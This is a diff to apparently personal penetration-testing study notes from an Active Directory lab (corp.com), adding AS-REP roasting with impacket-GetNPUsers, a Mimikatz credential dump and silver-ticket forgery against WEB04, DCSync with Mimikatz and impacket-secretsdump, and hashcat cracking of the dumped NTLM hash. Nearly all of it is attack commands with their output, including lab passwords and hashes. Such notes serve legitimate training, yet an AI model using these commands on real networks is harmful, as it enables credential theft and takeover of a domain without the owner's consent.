@@ -2377,6 +2377,10 @@ type .\usernames.txt
 
 #### Using GetNPUsers to perform AS-REP roasting
 
+~~~ bash
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete:'Nexus123!'
+~~~
+
 ~~~ shell
 kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -2526,15 +2530,224 @@ d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81
 
 
 
+### Silver Tickets
+---
+
+
+#### Trying to access the web page on WEB04 as user jeff
+
+~~~ powershell
+PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
+iwr :
+401 - Unauthorized: Access is denied due to invalid credentials.
+Server Error
+
+  401 - Unauthorized: Access is denied due to invalid credentials.
+  You do not have permission to view this directory or page using the credentials that you supplied.
+
+At line:1 char:1
++ iwr -UseBasicParsing -UseDefaultCredentials http://web04
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+~~~
+
+#### Using Mimikatz to obtain the NTLM hash of the user account iis_service which is mapped to the target SPN
+
+~~~ powershell
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1147751 (00000000:00118367)
+Session           : Service from 0
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 4:52:14 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
+         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
+...
+~~~
+
+#### Obtaining the domain SID
+
+~~~ powershell
+PS C:\Users\jeff> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
+~~~
+
+#### Forging the service ticket with the user jeffadmin and injecting it into the current session
+
+~~~ powershell
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+User      : jeffadmin
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+Service   : http
+Target    : web04.corp.com
+Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
+
+mimikatz # exit
+Bye!
+~~~
+
+
+#### Listing Kerberos tickets to confirm the silver ticket is submitted to the current session
+
+~~~ powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0xa04cc
+
+Cached Tickets: (1)
+
+#0>     Client: jeffadmin @ corp.com
+        Server: http/web04.corp.com @ corp.com
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 9/14/2022 4:37:32 (local)
+        End Time:   9/11/2032 4:37:32 (local)
+        Renew Time: 9/11/2032 4:37:32 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+~~~
+
+#### Accessing the SMB share with the silver ticket
+
+~~~ powershell
+PS C:\Tools> iwr -UseDefaultCredentials http://web04
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+                    <html xmlns="http://www.w3.org/1999/xhtml">
+                    <head>
+                    <meta http-equiv="Content-Type" cont...
+RawContent        : HTTP/1.1 200 OK
+                    Persistent-Auth: true
+                    Accept-Ranges: bytes
+                    Content-Length: 703
+                    Content-Type: text/html
+                    Date: Wed, 14 Sep 2022 11:37:39 GMT
+                    ETag: "b752f823fc8d81:0"
+                    Last-Modified: Wed, 14 Sep 20...
+Forms             :
+Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
+                    text/html]...}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
+                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
+                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
+ParsedHtml        :
+RawContentLength  : 703
+~~~
+
+
+### Domain Controller Synchronization
+---
+
+#### Using Mimikatz to perform a dcsync attack to obtain the credentials of dave
+
+~~~ powershell
+PS C:\Users\jeffadmin> cd C:\Tools\
+
+PS C:\Tools> .\mimikatz.exe
+...
+
+mimikatz # lsadump::dcsync /user:corp\dave
+[DC] 'corp.com' will be the domain
+[DC] 'DC1.corp.com' will be the DC server
+[DC] 'corp\dave' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 9:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
+    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+...
+~~~
 
 
 
+#### Using Hashcat to crack the NTLM hash obtained by the dcsync attack
 
+~~~ powershell
+kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+08d7a47a6f9f66b97b1bae4178747494:Flowers1              
+...
+~~~
 
+#### Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator
 
+~~~ powershell
+mimikatz # lsadump::dcsync /user:corp\Administrator
+...
+Credentials:
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+...
+~~~
 
+#### Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave
 
+~~~ bash
+kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+[*] Kerberos keys grabbed
+dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+dave:des-cbc-md5:1a329b4338bfa215
+[*] Cleaning up...
+~~~
 
 
 
